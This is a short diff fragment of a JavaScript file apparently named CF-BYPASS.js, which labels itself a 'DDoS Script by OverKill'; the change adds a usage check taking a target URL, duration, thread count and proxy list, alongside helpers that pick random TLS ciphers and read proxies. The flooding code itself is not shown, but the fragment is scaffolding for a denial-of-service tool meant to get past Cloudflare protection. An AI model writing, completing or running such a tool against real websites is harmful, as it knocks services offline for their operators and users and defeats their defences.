@@ -98,7 +98,14 @@ function controling() {
 function cipher() {
     return cplist[Math.floor(Math.random() * cplist.length)];
 }
-
+if (process.argv.length < 6) {
+    console.log("\x1b[31m ERROR\x1b[37m: Nhập thiếu dữ liệu");
+    console.log("\x1b[36m USAGE\x1b[37m: node CF-BYPASS.js <target> <time> <thread> <proxies>");
+    console.log("\x1b[32m EXAMPLE\x1b[37m: node CF-BYPASS.js https://example.com 60 100 proxy.txt");
+    console.log("\x1b[93m DDoS Script by:\x1b[34m OverKill ");
+  
+    process.exit();
+}
 const target = process.argv[2], time = process.argv[3], thread = process.argv[4], proxys = fs.readFileSync(process.argv[5], 'utf-8').toString().match(/\S+/g);
 
 function proxyr() {
